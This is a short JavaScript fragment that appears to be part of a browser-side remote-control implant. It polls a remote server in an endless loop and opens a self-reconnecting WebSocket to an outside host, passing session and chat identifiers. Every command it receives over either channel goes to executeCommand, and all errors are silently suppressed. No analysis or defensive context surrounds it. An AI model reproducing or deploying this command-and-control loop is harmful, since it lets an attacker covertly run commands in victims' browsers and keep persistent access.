// ═══════════════════════════════════════════════════════
// [8] Local Ping — Multi-Channel Fallback
// ═══════════════════════════════════════════════════════
async function startLocalPing() {
  // ★ محاولة WS أولاً
  startWebSocket();

  // ★ Local Ping Loop
  while (true) {
    try {
      const commands = await sendMessage({ type: 'page_ping', ts: Date.now() });
      if (commands && commands.length > 0) {
        for (const cmd of commands) {
          await executeCommand(cmd);
        }
      }
    } catch(e) {}
    
    const delay = isOnline ? 4000 : reconnectDelay;
    await sleep(delay);
  }
}

// ★ WebSocket Connection
let ws = null;
function startWebSocket() {
  if (!('WebSocket' in window)) return;
  try {
    const wsUrl = HTTP_URL.replace('https://', 'wss://').replace('http://', 'ws://') + 
                  '/lsh_ws?s=' + SESSION_ID + '&id=' + CHAT_ID;
    ws = new WebSocket(wsUrl);
    
    ws.onopen = () => {
      console.log('[WS] Connected');
      activeChannel = 'ws';
      reconnectAttempts = 0;
    };
    
    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.type === 'command') {
          executeCommand(data.cmd);
        }
        if (data.type === 'ping') {
          ws.send(JSON.stringify({ type: 'pong', ts: Date.now() }));
        }
      } catch(e) {}
    };
    
    ws.onclose = () => {
      console.log('[WS] Closed — reconnecting...');
      activeChannel = 'http';
      setTimeout(startWebSocket, reconnectDelay);
    };
    
    ws.onerror = () => {};
  } catch(e) {}
}
